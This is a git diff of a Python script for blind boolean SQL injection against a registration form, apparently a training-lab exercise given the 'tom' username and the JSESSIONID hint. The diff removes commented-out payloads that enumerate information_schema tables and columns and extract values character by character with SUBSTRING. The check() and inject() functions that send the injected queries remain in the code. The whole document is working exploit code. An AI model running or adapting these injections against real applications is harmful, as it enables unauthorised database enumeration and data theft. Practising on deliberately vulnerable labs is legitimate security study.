@@ -9,17 +9,6 @@ def check(cookie="", query=""):
         'Cookie': cookie,
     }
 
-    #userid
-    # query = f'tom\' and exists (select {column_name} from {table_name} where ' \
-    #         f'{column_name}=\'{user_id}\')--'
-
-    #column
-    # query = f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
-    # f'and column_name= \'{column_name}\')--'
-    print(query)
-    #table
-    # table_query = f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE ' \
-    #               f'table_name = \'{table_name}\')--'
     data = {
         'username_reg': query,
         'email_reg': 'paul@gmail.com',
@@ -43,20 +32,10 @@ def check(cookie="", query=""):
         return True
 
 
-def inject(table_name="", column_name="", cookie="", query=""):
+def inject(cookie="", query=""):
     headers = {
         'Cookie': cookie,
     }
-
-    # users
-    # query = f'tom\' and exists (select {column_name} from {table_name} where ' \
-    #         f'substring({column_name},1, {length})=\'{word}\')--'
-    # columns
-    # query = f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
-    # f'and substring(column_name,1,{length})=\'{word}\')--'
-
-    # query = f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE ' \
-    #               f'SUBSTRING(table_name, 1, {length})=\'{word}\')--'
     print(query)
     data = {
         'username_reg': query,
@@ -69,7 +48,6 @@ def inject(table_name="", column_name="", cookie="", query=""):
 
     try:
         response = json.loads(r.text)
-        # print(response)
 
     except:
         print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
